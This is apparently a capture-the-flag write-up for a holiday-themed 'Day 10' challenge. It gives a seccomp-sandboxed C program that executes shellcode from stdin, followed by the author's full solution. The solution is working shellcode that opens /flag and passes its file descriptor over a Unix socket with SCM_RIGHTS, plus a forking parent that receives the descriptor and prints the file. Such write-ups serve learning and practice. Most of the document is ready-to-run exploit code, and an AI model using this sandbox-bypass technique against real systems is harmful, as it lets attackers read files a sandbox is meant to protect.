# Day 10

Attachment:

```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#define SANTA_FREQ_ADDR (void *)0x1225000

int setup_sandbox()
{
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        return 1;
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(recvmsg), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendmsg), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
        perror("seccomp_rule_add");
        return 1;
    }

    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        return 1;
    }

    seccomp_release(ctx);

    return 0;
}

int main(int argc, char *argv[])
{
    puts("📡 Tuning to Santa's reserved frequency...");
    void *code = mmap(SANTA_FREQ_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (code != SANTA_FREQ_ADDR) {
        perror("mmap");
        return 1;
    }

    puts("💾 Loading incoming elf firmware packet...");
    if (read(0, code, 0x1000) < 0) {
        perror("read");
        return 1;
    }

    puts("🧝 Protecting station from South Pole elfs...");
    if (setup_sandbox() != 0) {
        perror("setup_sandbox");
        return 1;
    }

    // puts("🎙️ Beginning uplink communication...");
    ((void (*)())(code))();

    // puts("❄️ Uplink session ended.");
    return 0;
}
```

This time, we can only use `openat/recvmsg/sendmsg` syscalls. `sendmsg` can be used to send file descriptors between processes. So, inspired by <https://stackoverflow.com/questions/28003921/sending-file-descriptor-by-linux-socket>, we:

1. run a parent process that creates a unix socket pair
2. fork and execve as `/challenge/northpole`, execute `openat + sendmsg` in the shellcode to send the flag fd to parent
3. read flag from parnet

The shellcode part:

```c
// gcc payload.c -o payload.o -ffreestanding -nostdlib && objcopy -O binary -j
// .text payload.o payload.bin && objdump -m i386 -M amd64 -D -b binary
// payload.bin
#include <fcntl.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/syscall.h>

// adapted from
// https://stackoverflow.com/questions/28003921/sending-file-descriptor-by-linux-socket
void test() {
  // reuse address on stack
  unsigned long long rsp_value;
  asm volatile("mov %%rsp, %0" : "=r"(rsp_value));
  rsp_value -= rsp_value % 4096;

  // open flag
  int fd;
  char path[10] = "/flag";
  if (1) {
    // arguments
    register uint64_t rdi __asm__("rdi") = AT_FDCWD;
    register uint64_t rsi __asm__("rsi") = (uint64_t)path;
    register int rdx __asm__("rdx") = O_RDONLY;
    register int r10 __asm__("r10") = 0;
    register int r8 __asm__("r8") = 0;
    register int r9 __asm__("r9") = 0;
    register int rax __asm__("rax") = SYS_openat;
    int ret;
    __asm__ volatile("syscall\n" // Execute system call
                     : "=a"(ret) // Output: result in rax
                     :
                     : "rcx", "r11",
                       "memory" // Clobbered registers
    );
    fd = ret;
  }

  // send fd
  struct msghdr msg = {0};
  char buf[CMSG_SPACE(sizeof(fd))];
  for (int i = 0; i < sizeof(buf); i++) {
    buf[i] = '\0';
  }
  struct iovec io = {.iov_base = "", .iov_len = 0};

  msg.msg_iov = &io;
  msg.msg_iovlen = 1;
  msg.msg_control = buf;
  msg.msg_controllen = sizeof(buf);

  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(fd));

  *((int *)CMSG_DATA(cmsg)) = fd;

  msg.msg_controllen = CMSG_SPACE(sizeof(fd));

  if (1) {
    // arguments
    register int rdi __asm__("rdi") = 3;
    register uint64_t rsi __asm__("rsi") = (uint64_t)&msg;
    register int rdx __asm__("rdx") = 0;
    register int r10 __asm__("r10") = 0;
    register int r8 __asm__("r8") = 0;
    register int r9 __asm__("r9") = 0;
    register int rax __asm__("rax") = SYS_sendmsg;
    int ret;
    __asm__ volatile("syscall\n" // Execute system call
                     : "=a"(ret) // Output: result in rax
                     :
                     : "rcx", "r11",
                       "memory" // Clobbered registers
    );
    fd = ret;
  }
}
```

The parent process part:

```c
// adapted from
// https://stackoverflow.com/questions/28003921/sending-file-descriptor-by-linux-socket

#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static int receive_fd(int socket) // receive fd from socket
{
  struct msghdr msg = {0};

  char m_buffer[256];
  struct iovec io = {.iov_base = m_buffer, .iov_len = sizeof(m_buffer)};
  msg.msg_iov = &io;
  msg.msg_iovlen = 1;

  char c_buffer[256];
  msg.msg_control = c_buffer;
  msg.msg_controllen = sizeof(c_buffer);

  if (recvmsg(socket, &msg, 0) < 0)
    printf("Failed to receive message\n");

  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);

  unsigned char *data = CMSG_DATA(cmsg);

  printf("About to extract fd\n");
  int fd = *((int *)data);
  printf("Extracted fd %d\n", fd);

  return fd;
}

int main(int argc, char **argv) {
  int sv[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) != 0)
    printf("Failed to create Unix-domain socket pair\n");

  int pid = fork();
  if (pid > 0) // in parent
  {
    printf("Parent at work\n");
    close(sv[0]);
    int sock = sv[1];

    nanosleep(&(struct timespec){.tv_sec = 0, .tv_nsec = 500000000}, 0);

    int fd = receive_fd(sock);
    printf("Read %d!\n", fd);
    char buffer[256];
    ssize_t nbytes;
    while ((nbytes = read(fd, buffer, sizeof(buffer))) > 0)
      write(1, buffer, nbytes);
    printf("Done!\n");
    close(fd);
  } else // in child
  {
    close(sv[1]);
    int sock = sv[0];
    printf("Child at play, sock %d\n", sock);
    assert(sock == 3);

    // redirect stdin
    int payload_fd = open("payload.bin", O_RDONLY);
    dup2(payload_fd, 0);

    execve("/challenge/northpole-relay", NULL, NULL);
  }
  return 0;
}
```
